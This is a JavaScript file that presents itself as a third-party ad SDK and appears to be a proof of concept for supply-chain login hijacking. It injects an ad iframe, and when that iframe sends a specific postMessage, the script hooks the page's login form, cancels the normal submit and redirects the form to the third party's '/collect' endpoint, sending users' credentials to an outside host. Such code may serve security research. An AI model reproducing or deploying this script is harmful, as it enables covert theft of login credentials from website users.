(() => {
  function getThirdpartyOrigin() {
    try {
      const cs = document.currentScript && document.currentScript.src;
      if (cs) return new URL(cs).origin;
    } catch (_) {}

    try {
      const s = Array.from(document.scripts || []).find(x => (x.src || "").includes("/sdk.js"));
      if (s && s.src) return new URL(s.src).origin;
    } catch (_) {}

    return "";
  }

  const THIRD_PARTY_ORIGIN = getThirdpartyOrigin();
  let armed = false;

  console.log("[thirdparty sdk] loaded");

  function injectAdWidget() {
    if (!THIRD_PARTY_ORIGIN) return;
    if (document.getElementById("adWidgetContainer")) return;

    const container = document.createElement("div");
    container.id = "adWidgetContainer";
    container.style.cssText = `
      position: fixed;
      right: 16px;
      bottom: 16px;
      width: 300px;
      height: 250px;
      z-index: 9999;
      box-shadow: 0 8px 30px rgba(0,0,0,0.25);
      border-radius: 12px;
      overflow: hidden;
      background: white;
    `;
    
    const iframe = document.createElement("iframe");
    iframe.src = `${THIRD_PARTY_ORIGIN}/widget.html`;
    iframe.width = "300";
    iframe.height = "250";
    iframe.style.border = "0";
    iframe.setAttribute("title", "Ad Widget");

    container.appendChild(iframe);
    document.documentElement.appendChild(container);
  }

  function setupMessageListener() {
    window.addEventListener("message", (event) => {
      if (!THIRD_PARTY_ORIGIN) return;
      if (event.origin !== THIRD_PARTY_ORIGIN) return;

      const data = event.data || {};
      if (data.type === "AD_INTERACTION" && data.action === "ARM_FORM_SWAP") {
        armed = true;

        console.log("[thirdparty sdk] armed by widget message");
        const status = document.getElementById("status");
        if (status) status.textContent += " | thirdparty:armed(by postMessage)";
      }
    });
  }

  function hookFormSubmit() {
    const form = document.getElementById("loginForm");
    
    if (!form) return;
    
    form.addEventListener("submit", (e) => {
      if (!armed) return;
      if (!THIRD_PARTY_ORIGIN) return;
      
      if (form.dataset.pocResubmitting === "1") return;
      
      e.preventDefault();
      e.stopImmediatePropagation();
      
      form.action = `${THIRD_PARTY_ORIGIN}/collect`;
      console.log("[thirdparty sdk] swapped form.action to", form.action);
      
      form.dataset.pocResubmitting = "1";
      
      queueMicrotask(() => {
        try {
          form.submit();
        } finally {
          form.dataset.pocResubmitting = "0";
        }
      });
    }, { capture: true });
  }

  document.addEventListener("DOMContentLoaded", () => {
    injectAdWidget();
    setupMessageListener();
    hookFormSubmit();
  });
})();